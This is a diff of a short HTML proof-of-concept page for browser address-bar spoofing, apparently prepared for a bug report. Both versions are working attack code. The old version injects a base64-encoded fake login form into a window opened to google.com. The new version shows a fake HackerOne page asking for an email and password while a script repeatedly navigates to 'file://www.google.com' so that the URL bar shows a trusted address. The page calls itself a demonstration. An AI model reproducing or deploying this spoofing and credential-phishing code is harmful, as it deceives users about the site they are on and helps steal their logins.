@@ -1,16 +1,14 @@
-<body>
+<html>
+<title>I'm not real Hackerone page</title>
+<h1> This is Not Hackerone, this is just to demonstrate url spoofing, I'm not real.</h1>
+<form>
+Enter your Email: <input type="text" name="username" placeholder="email"><br>
+Enter your Password: <input type="text" name="password" placeholder="pass">
 <script>
-var encode='PGh0bWw+CjxoMT5UaGlzIGlzIG5vdCBhY3R1YWwgYWRkcmVzcywgdGhpcyBpcyBqdXN0IHRvIGRlbW9uc3RyYXRlIHNwb29mIHdlYiBhZGRyZXNzPC9oMT4KPGgyPkVudGVyIHVzZXJuYW1lIGFuZCBwYXNzd29yZCB0byBjb250aW51ZTwvaDI+Cjxmb3JtPgpFbnRlciB5b3VyIEVtYWlsOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIHBsYWNlaG9sZGVyPSJlbWFpbCI+PGJyPgpFbnRlciB5b3VyIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJwYXNzIj4KPC9mb3JtPgo8L2h0bWw+';
-
-window.onclick = function(){
-  var x = window.open('http://google.com')
-  setTimeout(function(){
-    x.document.body.innerHTML = atob(encode);
-  }, 100);
+function spoof()
+{
+location.assign("file://www.google.com");
 }
-
+setInterval("spoof()", 5);
 </script>
-
-This page has moved. <a href='#'>Click here to be redirected</a>
-</body>
 </html>
